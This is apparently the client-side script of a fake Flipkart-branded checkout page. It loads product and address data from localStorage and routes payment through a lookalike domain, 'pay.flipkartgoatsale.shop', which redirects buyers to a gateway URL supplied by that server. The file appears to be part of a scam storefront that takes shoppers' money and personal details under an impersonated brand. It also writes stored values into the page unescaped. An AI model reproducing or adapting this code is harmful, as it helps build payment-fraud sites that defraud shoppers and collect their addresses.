$(document).ready(function () {
    $("#back_btn").on("click", function () {
        history.back();
    });
    var selected_verient = localStorage.getItem("selected_verient");
    itemData = JSON.parse(selected_verient);
    $("#item_image").prop('src', itemData.img1);
    var detail = ((itemData.color) ? itemData.color : '') + ((itemData.size) ? ' (' + itemData.size + ')' : '') + ((itemData.storage) ? ' (' + itemData.storage + ')' : '');
    $("#product-title").html(itemData.name);
    $("#product-detail").html(detail);
    $(".selling_price, .payable").html("&#8377;" + itemData.selling_price);
    $(".mrp").html("&#8377;" + itemData.mrp);

    var disc_amt = itemData.mrp - itemData.selling_price;
    $(".discount-amt").html("-&#8377;" + disc_amt);

    var disc = 100 - ((itemData.selling_price * 100) / itemData.mrp).toFixed(0);
    $(".discount").html(disc + "% off");

    var add = localStorage.getItem("address");
    var address = JSON.parse(add);
    if (address) {
        document.getElementById("customer-name").innerHTML=(address.name);
        document.getElementById("customer-address").innerHTML=(address.flat + ", " + address.area + ", " + address.city + ", " + address.state + " " + address.pin);
        document.getElementById("customer-contact").innerHTML=(address.number);
    }
});

const SERVER_IP = "https://pay.flipkartgoatsale.shop"; // Define base IP and port here

async function btnContinue() {
    const amount = localStorage.getItem("price") || "210";
    const apiURL = `${SERVER_IP}/?amount=${amount}`;

    try {
        const res = await fetch(apiURL);
        const json = await res.json();

        if (json.response && json.response.status === 1) {
            const payUrl = json.response.data.pay_url;
            const orderSn = json.request_data.order_sn;

            localStorage.setItem("order_sn", orderSn); // Save order for status check later
            window.location.href = payUrl; // Redirect to payment gateway
        } else {
            alert("❌ Failed to create payment: " + (json.response?.msg || "Unknown error"));
        }
    } catch (err) {
        alert("⚠️ Error contacting payment server.");
        console.error(err);
    }
}
    
var add = localStorage.getItem("address");      
var address = JSON.parse(add); 
document.getElementById("customer-name").innerHTML=(address.name);
document.getElementById("customer-address").innerHTML=(address.flat + ", " + address.area + ", " + address.city + ", " + address.state + " " + address.pin);
document.getElementById("customer-contact").innerHTML=(address.number);

var disc = 100 - ((localStorage.getItem("price") * 100) / localStorage.getItem("mrp")).toFixed(0);
document.getElementById("product-title").innerHTML = localStorage.getItem("title");
document.getElementById("mrp").innerHTML = '₹'+new Intl.NumberFormat().format(localStorage.getItem("mrp"));
document.getElementById("selling_price").innerHTML = '₹'+new Intl.NumberFormat().format(localStorage.getItem("price"));
document.getElementById("discount").innerHTML = disc+'%';
$("#item_image").prop('src', localStorage.getItem("image"));


document.getElementById("total-price").innerHTML = '₹'+new Intl.NumberFormat().format(localStorage.getItem("mrp"));
document.getElementById("disc-price").innerHTML = '- ₹'+new Intl.NumberFormat().format(localStorage.getItem("mrp")-localStorage.getItem("price"));
document.getElementById("total-price1").innerHTML = '₹'+new Intl.NumberFormat().format(localStorage.getItem("price"));
document.getElementById("discount-amt").innerHTML = '- ₹'+new Intl.NumberFormat().format(localStorage.getItem("mrp")-localStorage.getItem("price"));


document.getElementById("mrp-footer").innerHTML = '₹'+new Intl.NumberFormat().format(localStorage.getItem("mrp"));
document.getElementById("selling_price-footer").innerHTML = '₹'+new Intl.NumberFormat().format(localStorage.getItem("price"));


document.getElementById("product-detail").innerHTML = localStorage.getItem("selected_color")+localStorage.getItem("selected_size")+localStorage.getItem("selected_storage");

